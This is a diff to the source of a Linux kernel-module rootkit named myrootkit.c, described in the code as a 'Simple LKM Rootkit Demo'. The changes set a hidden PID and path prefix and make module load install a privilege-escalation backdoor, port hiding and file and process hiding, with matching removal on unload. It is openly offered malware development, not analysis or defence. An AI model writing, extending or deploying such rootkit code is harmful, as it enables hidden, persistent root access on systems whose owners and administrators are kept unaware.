@@ -30,9 +30,9 @@ File: myrootkit.c
 //__task_cred
 #include <linux/cred.h>
 
-#include "motekit.h"
-
 MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Mote");
+MODULE_DESCRIPTION("A Simple LKM Rootkit Demo");
 
 
 // ========== WRITE_PROTECTION HELPER ==========
@@ -310,10 +310,10 @@ hook_stop(void)
         }                                                   \
     }while(0)
 
-# define ROOT_PATH "/"
+# define ROOT_PATH "/proc/"
 # define SECRET_FILE "Hidden_"
 # define PROCESS_ROOT_PATH 
-# define SECRET_PROC 9582	
+# define SECRET_PROC 8056	
 
 int 
 (*real_iterate_shared)(struct file *, struct dir_context *); 
@@ -528,13 +528,19 @@ void clean_priviledge_backdoor(void)
 //========== ROOTKIT START =================
 static int __init myrootkit_init(void)
 {
-	hook_start();
+	
+	set_priviledge_backdoor();
+	hideport_start();
+	hide_file_and_process_start();
 	return 0;
 }
 
 static void __exit myrootkit_exit(void)
 {
-	hook_stop();	
+	
+	clean_priviledge_backdoor();
+	hideport_stop();
+	hide_file_and_process_stop();
 }
 
 
